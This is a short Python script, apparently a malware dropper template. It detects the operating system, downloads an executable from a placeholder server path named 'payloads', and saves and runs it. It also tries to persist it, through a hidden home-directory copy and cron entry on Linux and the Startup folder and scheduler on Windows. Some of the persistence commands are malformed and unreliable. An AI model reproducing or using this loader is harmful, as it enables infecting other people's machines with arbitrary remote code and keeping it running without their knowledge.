import subprocess, platform
import requests, shutil, os
from pathlib import Path

# Detect Operational System
platform_os = platform.system()
# Set Filename to Download and Execcute:
if platform_os == "Linux":
    filename = "Linux Executable Name" #ELF: Executable and Linkable Format
elif platform_os == "Windows":
    filename = "Windows Exe Name.exe" #EXE: Executable


if True:
    # Download:
    data = requests.get("http://your-server.com/payloads/{0}".format(filename))
    # Save
    with open(filename, "wb") as fl:
        fl.write(data.content)
    
# Try persistense [WIP]:
try:
    if platform_os == "Linux":
        shutil.copy(filename, '{0}/.{1}'.format(Path.home(), filename))
        os.system("chmod +x {0}/.{1}".format(Path.home(), filename))
        os.system("crontab -e :set for every 10 min;0-59/10 * * * * ./{0}/.{1}".format(Path.home(), filename))
    elif platform_os == "Windows":
        new_path = '%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\{0}'.format(filename)
        shutil.copy(filename, new_path)
        os.system('sc config schedule start=auto;net start schedule at 12:00 \"\"{0}\"\"'.format(new_path))
except Exception as error:
    print(error)
        
# Run:
subprocess.Popen(args="", executable=filename)
